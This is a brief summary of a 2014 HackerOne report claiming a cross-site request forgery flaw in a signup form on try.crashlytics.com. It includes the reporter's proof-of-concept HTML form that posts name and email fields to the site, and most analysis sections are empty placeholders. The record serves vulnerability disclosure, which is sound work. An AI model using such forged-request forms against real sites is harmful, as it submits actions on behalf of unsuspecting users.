# CSRF   in crashlytics.com

## Metadata
- **Source:** HackerOne
- **Report:** 13856 | https://hackerone.com/reports/13856
- **Submitted:** 2014-05-28
- **Reporter:** defmax
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Cross-Site Request Forgery (CSRF)
- **CVEs:** None
- **Category:** web-api

## Summary
Hello Sir 

This is N B Sri Harsha 

I Have Found An  CSRF  in  http://try.crashlytics.com/


POC ;- 

<form method="POST" action="http://try.crashlytics.com/list/" class="validatable" id="beta_form">
                                <input id="validate" class="clear validate validate-name validate-message" placeholder="your name" name="name" type="text">
                                

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hello Sir 

This is N B Sri Harsha 

I Have Found An  CSRF  in  http://try.crashlytics.com/


POC ;- 

<form method="POST" action="http://try.crashlytics.com/list/" class="validatable" id="beta_form">
                                <input id="validate" class="clear validate validate-name validate-message" placeholder="your name" name="name" type="text">
                                <input id="validate" class="clear validate validate-message" placeholder="name@server.com" name="email" type="text">
                                <input name="sitereferral" value="" type="hidden">
                                <input value="" id="emailVerify" type="submit">
                            </form>



</details>

---
*Analysed by Claude on 2026-05-24*
